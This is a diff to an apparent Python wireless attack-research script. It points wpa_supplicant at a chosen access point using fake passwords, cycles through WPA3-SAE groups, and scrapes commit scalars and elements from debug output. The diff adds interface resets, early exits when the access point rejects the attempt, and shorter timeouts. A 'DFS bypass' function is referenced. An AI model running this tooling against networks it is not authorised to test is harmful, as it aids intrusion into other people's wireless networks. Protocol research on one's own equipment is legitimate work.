@@ -21,7 +21,7 @@ TARGET_BSSID = "AA:BB:CC:DD:EE:11".lower()
 TARGET_CHANNEL = "X"    # Channel of the target network
 REGULATORY_DOMAIN = "PA"  # Sets the region (e.g., PA, DE, US)
 PAIRS_PER_GROUP = 20
-MAX_ATTEMPTS = 10       # Skip if AP doesn't support the group
+MAX_ATTEMPTS = 5       # Skip if AP doesn't support the group
 # =============================================================
 
 SAE_GROUPS = [19, 20, 21, 22, 23, 24]
@@ -68,10 +68,13 @@ def initial_dfs_bypass():
     time.sleep(0.5)
 
 def clean_wpa_state():
-    """Fast cleanup between attempts. Must be blazing fast."""
+    """Fast cleanup between attempts. Clears driver state."""
     os.system("killall wpa_supplicant 2>/dev/null")
     os.system(f"rm -rf /var/run/wpa_supplicant/{MANAGED_IFACE} 2>/dev/null")
+    os.system(f"ip link set {MANAGED_IFACE} down 2>/dev/null")
     time.sleep(0.1)
+    os.system(f"ip link set {MANAGED_IFACE} up 2>/dev/null")
+    time.sleep(0.2)
 
 def main():
     if os.geteuid() != 0:
@@ -84,9 +87,10 @@ def main():
     
     initial_dfs_bypass()
 
-    # Calculate frequency once
     target_freq = channel_to_freq(TARGET_CHANNEL)
     freq_line = f"    freq_list={target_freq}" if target_freq else ""
+
+    current_timeout = 15  
 
     for group_id in SAE_GROUPS:
         print(f"\n[*] ==========================================")
@@ -103,7 +107,6 @@ def main():
             count = len(collected[group_id]["scalars"])
             print(f"[*] Attempt {attempt}/{MAX_ATTEMPTS} -> Currently {count}/{PAIRS_PER_GROUP} pairs collected. (Using fake PW: {password})")
 
-            # WPA Supplicant Configuration
             conf = f"""ctrl_interface=/var/run/wpa_supplicant
 sae_groups={group_id}
 network={{
@@ -119,7 +122,6 @@ network={{
             with open("/tmp/temp_extract.conf", "w") as f:
                 f.write(conf)
 
-            # Run wpa_supplicant in debug mode and capture its console output
             cmd = ["wpa_supplicant", "-i", MANAGED_IFACE, "-c", "/tmp/temp_extract.conf", "-dd"]
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
 
@@ -127,10 +129,9 @@ network={{
             found_in_this_run = False
             start_time = time.time()
 
-
             while True:
 
-                if time.time() - start_time > 15:
+                if time.time() - start_time > current_timeout:
                     break
 
                 reads, _, _ = select.select([proc.stdout], [], [], 0.5)
@@ -140,25 +141,34 @@ network={{
                     if not line: 
                         break
 
+                    if "status_code=" in line and "status_code=0" not in line:
+                        print("      [!] AP rejected Auth (Wrong Group?). Skipping wait.")
+                        break
+                    if "SME: Authentication timeout" in line or "CTRL-EVENT-ASSOC-REJECT" in line:
+                        print("      [!] AP ignored Auth (Timeout). Skipping wait.")
+                        break
+                    # -------------------------------------------------------------
+
                     if "SAE: own commit-scalar - hexdump" in line:
                         scalar = line.split("):")[1].strip().replace(" ", "")
                     elif "SAE: own commit-element(x) - hexdump" in line:
                         elem_x = line.split("):")[1].strip().replace(" ", "")
                     elif "SAE: own commit-element(y) - hexdump" in line:
                         elem_y = line.split("):")[1].strip().replace(" ", "")
-                    elif "SAE: own commit-element - hexdump" in line: # For MODP groups (FFC)
+                    elif "SAE: own commit-element - hexdump" in line:
                         elem_ffc = line.split("):")[1].strip().replace(" ", "")
 
-                    # Stop parsing once we have all necessary parts for a commit
                     if scalar and ((elem_x and elem_y) or elem_ffc):
-                        # Combine X and Y coordinates for ECC groups
                         finite = elem_x + elem_y if (elem_x and elem_y) else elem_ffc
                         if scalar not in collected[group_id]["scalars"]:
                             collected[group_id]["scalars"].append(scalar)
                             collected[group_id]["finites"].append(finite)
                             found_in_this_run = True
+                            
+                            current_timeout = 8  
+                            
                             print(f"[+] ✅ Fast-Extract Success: Pair {len(collected[group_id]['scalars'])}/{PAIRS_PER_GROUP} extracted!")
-                        break # Break the stdout-loop, we have what we need
+                        break 
 
             proc.terminate()
             proc.wait()
@@ -169,7 +179,6 @@ network={{
             else:
                 attempt += 1
 
-        # --- GROUP COMPLETED: OUTPUT RESULTS IMMEDIATELY ---
         print(f"\n[*] Group {group_id} extraction finished. ({len(collected[group_id]['scalars'])} pairs)")
         print("="*80)
         print(f"SAE_SCALARS_GROUP_{group_id}_HEX = [")
